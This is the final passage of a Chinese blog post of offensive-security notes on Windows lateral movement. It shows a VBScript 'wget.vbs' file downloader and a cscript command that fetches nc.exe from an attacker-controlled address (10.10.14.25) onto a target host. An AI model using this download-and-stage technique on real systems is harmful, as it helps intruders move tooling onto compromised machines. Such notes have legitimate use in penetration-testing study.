nc.exe<br><br><span class="hljs-comment">## ------------------| Create wget.vbs file</span><br>dim xHttp: <span class="hljs-built_in">Set</span> xHttp = createobject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>)<br>dim bStrm: <span class="hljs-built_in">Set</span> bStrm = createobject(<span class="hljs-string">&quot;Adodb.Stream&quot;</span>)<br>xHttp.Open <span class="hljs-string">&quot;GET&quot;</span>, WScript.Arguments.Item(<span class="hljs-number">0</span>), False<br>xHttp.Send<br><br>with bStrm<br>    .type = <span class="hljs-number">1</span><br>    .open<br>    .write xHttp.responseBody<br>    .savetofile WScript.Arguments.Item(<span class="hljs-number">1</span>), <span class="hljs-number">2</span><br><span class="hljs-keyword">end</span> with<br><br><span class="hljs-comment">## ------------------| It can be executed as follows.</span><br>cscript /nologo wget.vbs http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.25</span>/nc.exe nc.exe<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
      
        <a href="/tags/Windows-Common-Command/" class="print-no-link">#Windows Common Command</a>
      
        <a href="/tags/Horizontal-Move/" class="print-no-link">#Horizontal Move</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Windows常用命令-横向移动-h4rithd-2024.04.03版本</div>
      <div>https://sh1yan.top/2024/06/02/Windows-Common-Command-Horizontal-Move-h4rithd-20240403/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月2日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/02/Linux-privilege-escalation-h4rithd-20240403/" title="Linux特权提升-h4rithd-2024.04.03版本">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Linux特权提升-h4rithd-2024.04.03版本</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/" title="Windows特权提升-h4rithd-2024.04.03版本">
                        <span class="hidden-mobile">Windows特权提升-h4rithd-2024.04.03版本</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
